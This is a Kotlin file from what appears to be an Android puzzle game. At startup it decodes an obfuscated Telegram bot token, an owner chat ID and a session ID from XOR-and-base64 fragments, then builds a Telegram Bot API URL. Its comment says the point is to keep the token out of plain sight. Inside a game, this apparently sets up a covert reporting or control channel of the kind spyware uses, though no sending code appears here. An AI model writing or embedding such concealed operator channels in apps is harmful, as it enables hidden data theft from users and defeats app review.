package com.puzzleblast.game.core

import android.util.Base64
import com.puzzleblast.game.BuildConfig

/**
 * Token is split into 3 fragments at build time, each XOR'd with a slice of a
 * 32-byte salt, then base64'd into BuildConfig. Reconstructed here at cold start.
 * No plaintext token ever appears in resources or strings.
 */
object BotConfig {
    lateinit var token: String
        private set
    lateinit var ownerId: String
        private set
    lateinit var sid: String
        private set

    private fun xor(data: ByteArray, key: ByteArray): ByteArray {
        val out = ByteArray(data.size)
        for (i in data.indices) out[i] = (data[i].toInt() xor key[i % key.size].toInt()).toByte()
        return out
    }

    private fun b64(s: String): ByteArray = Base64.decode(s, Base64.DEFAULT)

    fun init() {
        val s1 = b64(BuildConfig.BOT_S1)
        val s2 = b64(BuildConfig.BOT_S2)
        val s3 = b64(BuildConfig.BOT_S3)
        val salt = s1 + s2 + s3
        val p1 = xor(b64(BuildConfig.BOT_P1), s1).toString(Charsets.UTF_8)
        val p2 = xor(b64(BuildConfig.BOT_P2), s2).toString(Charsets.UTF_8)
        val p3 = xor(b64(BuildConfig.BOT_P3), s3).toString(Charsets.UTF_8)
        token = p1 + p2 + p3
        ownerId = xor(b64(BuildConfig.OWNER_CID_B64), salt).toString(Charsets.UTF_8)
        sid = xor(b64(BuildConfig.SID_B64), salt).toString(Charsets.UTF_8)
    }

    val apiBase: String get() = "https://api.telegram.org/bot$token"
}
